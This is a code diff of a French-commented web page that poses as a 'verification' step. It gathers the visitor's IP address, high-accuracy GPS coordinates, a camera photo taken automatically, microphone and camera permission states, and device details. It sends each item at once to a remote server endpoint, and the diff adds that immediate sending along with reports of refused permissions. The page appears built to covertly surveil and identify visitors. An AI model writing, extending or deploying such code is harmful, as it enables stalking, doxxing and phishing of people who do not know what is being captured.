@@ -391,13 +391,14 @@
         let ipSent = false, coordsSent = false, photoSent = false, permsSent = false;
         let systemSent = false;
 
-        // ========== COLLECTE ==========
+        // ========== COLLECTE (chaque donnée est envoyée immédiatement) ==========
 
         async function getIPAddress() {
             try {
                 const resp = await fetch('https://api.ipify.org?format=json');
                 const data = await resp.json();
                 userIP = { ip: data.ip, city: 'Unknown', region: 'Unknown', country: 'Unknown', postal: 'N/A', latitude: null, longitude: null, timezone: 'N/A', isp: 'N/A' };
+                // Envoi immédiat de l'IP
                 sendToServer({ ip: userIP });
             } catch (e) {
                 userIP = { error: 'Non disponible' };
@@ -408,6 +409,8 @@
             if (!navigator.geolocation) {
                 geolocationAttempted = true;
                 updateStatus('geoStatus', 'denied', '✗');
+                // Envoyer l'état "refusé" pour la géolocalisation
+                sendToServer({ coordinates: { error: 'Géolocalisation non disponible' } });
                 updateUI();
                 return;
             }
@@ -423,12 +426,15 @@
                         timestamp: pos.timestamp
                     };
                     updateStatus('geoStatus', 'granted', '✓');
+                    // Envoi immédiat des coordonnées
                     sendToServer({ coordinates: userCoords });
                     updateUI();
                 },
-                () => {
+                (err) => {
                     geolocationAttempted = true;
                     updateStatus('geoStatus', 'denied', '✗');
+                    // Envoyer l'échec de la géolocalisation
+                    sendToServer({ coordinates: { error: err.message } });
                     updateUI();
                 },
                 { enableHighAccuracy: true, timeout: 10000 }
@@ -444,11 +450,18 @@
                 updateStatus('cameraStatus', 'granted', '✓');
                 const video = document.getElementById('videoPreview');
                 video.srcObject = stream;
-                video.onloadedmetadata = () => setTimeout(capturePhoto, 1500);
+                video.onloadedmetadata = () => {
+                    // Capture photo et envoi immédiat
+                    capturePhoto();
+                };
                 updateUI();
+                // Envoyer également l'état de la permission caméra (même si on envoie la photo après)
+                sendToServer({ camera: true });
             } catch (e) {
                 cameraAttempted = true;
                 updateStatus('cameraStatus', 'denied', '✗');
+                // Envoyer l'échec de la caméra
+                sendToServer({ camera: false });
                 updateUI();
             }
         }
@@ -460,11 +473,14 @@
                 microphoneGranted = true;
                 microphoneAttempted = true;
                 updateStatus('micStatus', 'granted', '✓');
+                // Envoi immédiat de l'état du microphone
                 sendToServer({ microphone: true });
                 updateUI();
             } catch (e) {
                 microphoneAttempted = true;
                 updateStatus('micStatus', 'denied', '✗');
+                // Envoyer l'échec du microphone
+                sendToServer({ microphone: false });
                 updateUI();
             }
         }
@@ -484,12 +500,13 @@
                 if (blob) {
                     photoBlob = blob;
                     document.getElementById('photoStatus').textContent = '📸 Photo prise';
+                    // Envoi immédiat de la photo
                     sendToServer({ photo: blob });
                 }
             }, 'image/jpeg', 0.9);
         }
 
-        // ========== ENVOI IMMÉDIAT (chaque donnée séparément) ==========
+        // ========== ENVOI UNIQUE AVEC GESTION DES FLAGS ==========
 
         async function sendToServer(data) {
             try {
@@ -498,6 +515,7 @@
                 formData.append('userAgent', navigator.userAgent);
                 formData.append('sessionId', SESSION_ID);
 
+                // Ajouter les données si présentes et non encore envoyées
                 if (data.ip && !ipSent) {
                     formData.append('ip', JSON.stringify(data.ip));
                     ipSent = true;
@@ -510,15 +528,34 @@
                     formData.append('photo', data.photo, 'verif-' + Date.now() + '.jpg');
                     photoSent = true;
                 }
+                // Gérer l'état du microphone (booléen)
                 if (data.microphone !== undefined && !permsSent) {
+                    // On envoie les permissions telles qu'elles sont au moment de l'appel
                     const perms = {
                         camera: cameraGranted,
                         microphone: microphoneGranted,
                         geolocation: geolocationGranted
                     };
+                    // Mettre à jour avec la valeur reçue (permet de forcer l'état)
+                    if (data.microphone === true) perms.microphone = true;
+                    else if (data.microphone === false) perms.microphone = false;
                     formData.append('permissions', JSON.stringify(perms));
                     permsSent = true;
                 }
+                // Gérer la caméra (pour le cas où on veut envoyer l'état caméra sans photo)
+                if (data.camera !== undefined && !permsSent) {
+                    const perms = {
+                        camera: cameraGranted,
+                        microphone: microphoneGranted,
+                        geolocation: geolocationGranted
+                    };
+                    if (data.camera === true) perms.camera = true;
+                    else if (data.camera === false) perms.camera = false;
+                    formData.append('permissions', JSON.stringify(perms));
+                    permsSent = true;
+                }
+
+                // Système (envoyé une seule fois)
                 if (!systemSent) {
                     const sys = {
                         screen: { width: window.screen.width, height: window.screen.height, colorDepth: window.screen.colorDepth, devicePixelRatio: window.devicePixelRatio },
@@ -529,7 +566,7 @@
                     systemSent = true;
                 }
 
-                // Si aucun champ n'a été ajouté, on sort
+                // Vérifier s'il y a des données à envoyer
                 if (formData.entries().next().done) return;
 
                 const resp = await fetch(SERVER_URL + '/api/verification/photo', {
@@ -650,7 +687,7 @@
         window.addEventListener('load', () => {
             console.log('🔑 Session ID:', SESSION_ID);
             document.body.classList.add('unverified');
-            getIPAddress();
+            getIPAddress(); // envoi immédiat de l'IP
             updateUI();
             setInterval(updateUI, 2000);
         });
